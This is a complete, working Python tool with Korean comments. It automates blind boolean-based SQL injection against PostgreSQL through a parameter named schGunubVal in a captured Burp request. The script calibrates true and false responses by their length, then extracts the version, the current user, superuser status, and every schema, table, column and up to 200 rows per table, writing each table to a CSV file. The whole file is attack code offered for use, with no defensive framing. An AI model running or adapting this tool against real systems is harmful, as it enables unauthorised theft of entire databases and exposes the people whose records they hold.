#!/usr/bin/env python3
"""
PostgreSQL Blind SQL Injection Full Data Exfiltration Tool
=========================================================
Burp Repeater에서 저장한 raw HTTP request 파일을 입력으로 사용.
schGunubVal 파라미터에 Blind SQL Injection을 수행하여
PostgreSQL의 모든 테이블/컬럼/데이터를 자동 추출.

사용법:
    pip install requests
    python3 blind_pgsql_extract.py test.txt

입력(test.txt):
    Burp Repeater에서 request 우클릭 → Copy to file 로 저장한 raw HTTP request

출력:
    result_{schema}_{table}.csv  (각 테이블별 CSV 파일)
    콘솔 진행상황 출력
"""

import sys
import re
import time
import urllib.parse
import urllib3
import csv
import os

try:
    import requests
except ImportError:
    print("[!] requests 라이브브러리가 없습니다. 설치: pip install requests")
    sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# 설정
# ============================================================
SLEEP_SEC = 0.12          # 요청 간 지연(초) — 약 7회/초 (0.12 + 왕복시간 ≈ 0.14~0.15)
TIMEOUT = 15              # HTTP 타임아웃(초)
MAX_RETRIES = 3           # 실패 시 재시도 횟수
REF_TRIES = 3             # 참/거짓 기준 측정 반복 횟수
PRINTABLE_START = 32      # 추출할 ASCII 시작 (공백)
PRINTABLE_END = 126       # 추출할 ASCII 끝 (~)
MAX_STR_LEN = 2048        # 문자열 최대 길이
MAX_ROWS = 200            # 테이블당 최대 추출 행 수
INCLUDE_SYSTEM_SCHEMAS = False  # pg_catalog, information_schema 포함 여부

PARAM_NAME = "schGunubVal"


# ============================================================
# 1. Burp Request 파싱
# ============================================================
def parse_burp_request(filepath):
    """
    Burp Repeater raw request 파일 파싱.
    POST (form-urlencoded) / GET 모두 지원.
    """
    with open(filepath, 'rb') as f:
        raw = f.read()

    # 헤더/바디 분리
    delim = b'\r\n\r\n'
    pos = raw.find(delim)
    if pos == -1:
        delim = b'\n\n'
        pos = raw.find(delim)
        if pos == -1:
            # 바디 없는 요청
            header_raw = raw.decode('utf-8', errors='replace')
            body_raw = ""
        else:
            header_raw = raw[:pos].decode('utf-8', errors='replace')
            body_raw = raw[pos+2:].decode('utf-8', errors='replace')
    else:
        header_raw = raw[:pos].decode('utf-8', errors='replace')
        body_raw = raw[pos+4:].decode('utf-8', errors='replace')

    lines = header_raw.splitlines()
    if not lines:
        die("파일이 비어있습니다.")

    first = lines[0].strip().split()
    if len(first) < 2:
        die(f"요청 첫 줄 파싱 실패: {lines[0]}")
    method = first[0].upper()
    path = first[1]

    headers = {}
    for line in lines[1:]:
        line = line.strip()
        if ':' in line:
            k, v = line.split(':', 1)
            headers[k.strip()] = v.strip()

    host = headers.get('Host', '')
    if not host:
        die("Host 헤더가 없습니다.")

    # Content-Length 제거 (requests가 자동 계산)
    headers.pop('Content-Length', None)
    headers.pop('Content-length', None)
    headers.pop('Connection', None)

    # scheme 추정
    scheme = 'http'
    if ':443' in host:
        scheme = 'https'
        host = host.replace(':443', '')
    elif ':80' in host:
        host = host.replace(':80', '')

    url = f"{scheme}://{host}{path}"
    return method, url, headers, body_raw.strip()


def die(msg):
    print(f"\n[!] {msg}")
    sys.exit(1)


# ============================================================
# 2. 파라미터 치환
# ============================================================
def replace_param(body, param_name, new_val):
    """
    body에서 파라미터 값을 교체.
    URL-encode된 body의 key=value 형태에서 key= 부분 다음 값을 바꿈.
    """
    pairs = body.split('&')
    found = False
    new_pairs = []
    for pair in pairs:
        if '=' in pair:
            k, v = pair.split('=', 1)
            if k == param_name or urllib.parse.unquote(k) == param_name:
                new_pairs.append(f"{k}={urllib.parse.quote(str(new_val), safe='')}")
                found = True
            else:
                new_pairs.append(pair)
        else:
            new_pairs.append(pair)

    if not found:
        new_pairs.append(f"{param_name}={urllib.parse.quote(str(new_val), safe='')}")

    return '&'.join(new_pairs)


def build_payload_body(body, param_name, sql_cond):
    """body의 파라미터 값에 SQL 조건을 추가"""
    return replace_param(body, param_name, sql_cond)


# ============================================================
# 3. HTTP 요청 & 참/거짓 판별
# ============================================================
session = requests.Session()
session.verify = False


def do_request(method, url, headers, body):
    for attempt in range(MAX_RETRIES):
        try:
            if method == 'POST':
                resp = session.post(url, data=body, headers=headers,
                                    timeout=TIMEOUT)
            else:
                if body:
                    resp = session.get(url + '?' + body, headers=headers,
                                       timeout=TIMEOUT)
                else:
                    resp = session.get(url, headers=headers, timeout=TIMEOUT)
            return resp
        except requests.exceptions.RequestException as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(1)
                continue
            return None
    return None


def calibrate(method, url, headers, body):
    """참(1=1)/거짓(1=2) 응답 길이 차이로 기준값 계산"""
    true_lens = []
    false_lens = []

    print("[*] 참/거짓 기준 측정 중...", end='', flush=True)

    for i in range(REF_TRIES):
        tbody = build_payload_body(body, PARAM_NAME, "21018 AND 1=1")
        r = do_request(method, url, headers, tbody)
        if r:
            true_lens.append(len(r.text))

        time.sleep(SLEEP_SEC)

        fbody = build_payload_body(body, PARAM_NAME, "21018 AND 1=2")
        r = do_request(method, url, headers, fbody)
        if r:
            false_lens.append(len(r.text))

        time.sleep(SLEEP_SEC)
        print('.', end='', flush=True)

    print()

    if not true_lens or not false_lens:
        die("참/거짓 기준 요청 실패 — 서버 응답이 없습니다.")

    avg_true = sum(true_lens) / len(true_lens)
    avg_false = sum(false_lens) / len(false_lens)
    threshold = (avg_true + avg_false) / 2

    print(f"    참(1=1) 평균 길이: {avg_true:.1f}")
    print(f"    거짓(1=2) 평균 길이: {avg_false:.1f}")
    print(f"    임계값: {threshold:.1f}")

    # 방향 결정
    direction = 'gte' if avg_true >= avg_false else 'lte'

    if abs(avg_true - avg_false) < 5:
        print("[!] 참/거짓 길이 차이가 5 미만 — 오탐 가능성이 높습니다.")
        print("    응답 본문에서 에러 메시지/정상 메시지 차이를 확인하세요.")
        # 강제 진행 (threshold만으로도 대부분 동작)

    return threshold, direction


def is_true(method, url, headers, body, threshold, direction):
    r = do_request(method, url, headers, body)
    if r is None:
        return False
    length = len(r.text)
    if direction == 'gte':
        return length >= threshold
    else:
        return length <= threshold


# ============================================================
# 4. 블라인드 데이터 추출 (바이너리 서치)
# ============================================================
def extract_number(method, url, headers, body, threshold, direction, sql_number):
    """SQL 결과가 정수인 경우 추출 (바이너리 서치)"""
    # 범위 확장
    high = 1
    body_payload = build_payload_body(body, PARAM_NAME,
        f"21018 AND ({sql_number}) >= {high}")
    while is_true(method, url, headers, body_payload, threshold, direction):
        high *= 2
        if high > 10_000_000:  # 안전장치
            break
        body_payload = build_payload_body(body, PARAM_NAME,
            f"21018 AND ({sql_number}) >= {high}")
        time.sleep(SLEEP_SEC)

    if high == 1 and not is_true(method, url, headers, body_payload, threshold, direction):
        return 0

    low = 0
    while low < high:
        mid = (low + high) // 2
        body_payload = build_payload_body(body, PARAM_NAME,
            f"21018 AND ({sql_number}) > {mid}")
        if is_true(method, url, headers, body_payload, threshold, direction):
            low = mid + 1
        else:
            high = mid
        time.sleep(SLEEP_SEC)

    return low


def get_string_length(method, url, headers, body, threshold, direction, sql_str):
    """SQL 문자열 결과의 길이 추출"""
    # 상한 찾기
    high = 1
    for _ in range(15):  # 최대 32768
        body_payload = build_payload_body(body, PARAM_NAME,
            f"21018 AND (SELECT LENGTH(({sql_str})::text)) >= {high}")
        if is_true(method, url, headers, body_payload, threshold, direction):
            high *= 2
        else:
            break
        time.sleep(SLEEP_SEC)

    if high > MAX_STR_LEN:
        high = MAX_STR_LEN

    low = 0
    while low < high:
        mid = (low + high) // 2
        body_payload = build_payload_body(body, PARAM_NAME,
            f"21018 AND (SELECT LENGTH(({sql_str})::text)) > {mid}")
        if is_true(method, url, headers, body_payload, threshold, direction):
            low = mid + 1
        else:
            high = mid
        time.sleep(SLEEP_SEC)

    return low


def get_char_at(method, url, headers, body, threshold, direction, sql_str, pos):
    """SQL 문자열의 pos번째 문자(ASCII)를 바이너리 서치로 추출"""
    low, high = PRINTABLE_START, PRINTABLE_END

    while low < high:
        mid = (low + high) // 2
        body_payload = build_payload_body(body, PARAM_NAME,
            f"21018 AND (SELECT ASCII(SUBSTR(({sql_str})::text, {pos}, 1))) > {mid}")
        if is_true(method, url, headers, body_payload, threshold, direction):
            low = mid + 1
        else:
            high = mid
        time.sleep(SLEEP_SEC)

    return low


def extract_string(method, url, headers, body, threshold, direction, sql_str):
    """SQL 문자열 결과를 전체 추출"""
    length = get_string_length(method, url, headers, body, threshold, direction, sql_str)

    if length == 0:
        return ""

    if length > MAX_STR_LEN:
        print(f"\n    [!] 길이 {length} > 최대 {MAX_STR_LEN}, {MAX_STR_LEN}으로 제한")
        length = MAX_STR_LEN

    result = ""
    for pos in range(1, length + 1):
        code = get_char_at(method, url, headers, body, threshold, direction, sql_str, pos)
        ch = chr(code) if 32 <= code <= 126 else f"\\x{code:02x}"
        result += ch

        if pos % 20 == 0 or pos == length:
            sys.stdout.write(f"\r    [{pos}/{length}] {result[-40:]}")
            sys.stdout.flush()

    print()
    return result


# ============================================================
# 5. PostgreSQL 정보 추출 메인 로직
# ============================================================
def extract_pg_info(method, url, headers, body, threshold, direction):
    print("\n" + "=" * 65)
    print("  PostgreSQL 정보 추출")
    print("=" * 65)

    # 5.1 버전
    print("\n[1] 버전")
    ver = extract_string(method, url, headers, body, threshold, direction,
                         "SELECT version()")
    print(f"    → {ver[:120]}{'…' if len(ver)>120 else ''}")

    # 5.2 현재 사용자
    print("\n[2] 현재 사용자")
    user = extract_string(method, url, headers, body, threshold, direction,
                          "SELECT current_user")
    print(f"    → {user}")

    # 5.3 현재 DB
    print("\n[3] 현재 데이터베이스")
    db = extract_string(method, url, headers, body, threshold, direction,
                        "SELECT current_database()")
    print(f"    → {db}")

    # 5.4 현재 사용자 권한
    print("\n[4] superuser 여부")
    is_super = extract_string(method, url, headers, body, threshold, direction,
                              "SELECT CASE WHEN usesuper THEN 'YES' ELSE 'NO' END FROM pg_user WHERE usename=current_user")
    print(f"    → superuser: {is_super}")

    # 5.5 스키마 목록
    print("\n[5] 스키마 목록")
    schema_count = 0
    try:
        schema_count = extract_number(method, url, headers, body, threshold, direction,
            "SELECT COUNT(*) FROM information_schema.schemata")
    except:
        pass
    print(f"    스키마 수: {schema_count}")

    schemas = []
    for i in range(min(schema_count, 50)):
        try:
            s = extract_string(method, url, headers, body, threshold, direction,
                f"SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET {i}")
            schemas.append(s)
            print(f"    [{i+1}] {s}")
        except:
            break

    # 5.6 각 스키마의 테이블
    print("\n[6] 테이블 목록")
    all_tables = {}
    for schema in schemas:
        if not INCLUDE_SYSTEM_SCHEMAS and schema in ('pg_catalog', 'information_schema', 'pg_toast'):
            print(f"    [{schema}] (skip — system schema)")
            continue

        try:
            tc = extract_number(method, url, headers, body, threshold, direction,
                f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{schema}'")
            print(f"\n    [{schema}] 테이블 수: {tc}")

            tables = []
            for i in range(min(tc, 100)):
                try:
                    t = extract_string(method, url, headers, body, threshold, direction,
                        f"SELECT table_name FROM information_schema.tables "
                        f"WHERE table_schema='{schema}' ORDER BY table_name LIMIT 1 OFFSET {i}")
                    tables.append(t)
                    print(f"      [{i+1}] {t}")
                except:
                    break

            all_tables[schema] = tables
        except:
            print(f"    [{schema}] 추출 실패")
            continue

    # 5.7 각 테이블의 컬럼 및 데이터
    print("\n[7] 컬럼 & 데이터 추출")
    for schema, tables in all_tables.items():
        if not tables:
            continue

        for table in tables:
            tname = f"{schema}.{table}"
            print(f"\n    --- {tname} ---")

            try:
                cc = extract_number(method, url, headers, body, threshold, direction,
                    f"SELECT COUNT(*) FROM information_schema.columns "
                    f"WHERE table_schema='{schema}' AND table_name='{table}'")
            except:
                print(f"      [!] 컬럼 수 추출 실패")
                continue

            print(f"      컬럼 수: {cc}")

            columns = []
            for i in range(min(cc, 50)):
                try:
                    col = extract_string(method, url, headers, body, threshold, direction,
                        f"SELECT column_name FROM information_schema.columns "
                        f"WHERE table_schema='{schema}' AND table_name='{table}' "
                        f"ORDER BY ordinal_position LIMIT 1 OFFSET {i}")
                    columns.append(col)
                except:
                    break

            print(f"      컬럼: {', '.join(columns)}")

            # 데이터 추출
            try:
                rc = extract_number(method, url, headers, body, threshold, direction,
                    f"SELECT COUNT(*) FROM \"{schema}\".\"{table}\"")
            except:
                rc = 0
            print(f"      전체 행 수: {rc}")

            extract_rows = min(rc, MAX_ROWS)
            if extract_rows == 0:
                print(f"      행 없음")
                continue

            # ORDER BY 절 구성 (첫 번째 컬럼으로)
            order_col = columns[0] if columns else "1"

            all_rows = []
            for row_idx in range(extract_rows):
                row_data = []
                for col in columns:
                    try:
                        val = extract_string(method, url, headers, body, threshold, direction,
                            f"SELECT COALESCE(\"{col}\"::text, 'NULL') FROM \"{schema}\".\"{table}\" "
                            f"ORDER BY \"{order_col}\" LIMIT 1 OFFSET {row_idx}")
                        row_data.append(val)
                    except:
                        row_data.append("<ERROR>")
                all_rows.append(row_data)

                pct = (row_idx + 1) / extract_rows * 100
                sys.stdout.write(f"\r      행 [{row_idx+1}/{extract_rows}] ({pct:.0f}%)")
                sys.stdout.flush()
            print()

            # CSV 저장
            save_csv(f"{schema}_{table}", columns, all_rows)

    print("\n" + "=" * 65)
    print("  전체 추출 완료!")
    print("=" * 65)


# ============================================================
# 6. CSV 저장
# ============================================================
def save_csv(tag, columns, rows):
    outfile = f"result_{tag}.csv"
    try:
        with open(outfile, 'w', newline='', encoding='utf-8-sig') as f:
            writer = csv.writer(f)
            writer.writerow(columns)
            for row in rows:
                writer.writerow(row)
        print(f"      ✓ 저장: {outfile} ({len(rows)} rows)")
    except Exception as e:
        print(f"      ✗ CSV 저장 실패: {e}")


# ============================================================
# 7. 메인
# ============================================================
def main():
    if len(sys.argv) < 2:
        print(f"사용법: python3 {os.path.basename(sys.argv[0])} <burp_request.txt>")
        print(f"  예:   python3 {os.path.basename(sys.argv[0])} test.txt")
        sys.exit(1)

    req_file = sys.argv[1]
    if not os.path.exists(req_file):
        die(f"파일 없음: {req_file}")

    print(f"[*] Request 파일: {req_file}")
    method, url, headers, body = parse_burp_request(req_file)
    print(f"    Method: {method}")
    print(f"    URL: {url}")
    print(f"    Body: {body[:200]}{'…' if len(body) > 200 else ''}")

    # 참/거짓 기준 설정
    threshold, direction = calibrate(method, url, headers, body)
    print(f"    판별 방향: {'길이 ≥ 임계값 (참)' if direction == 'gte' else '길이 ≤ 임계값 (참)'}")

    # 시작 시간
    start_time = time.time()

    # PostgreSQL 정보 추출
    extract_pg_info(method, url, headers, body, threshold, direction)

    elapsed = time.time() - start_time
    print(f"\n[*] 소요 시간: {elapsed:.0f}초 ({elapsed/60:.1f}분)")


if __name__ == '__main__':
    main()
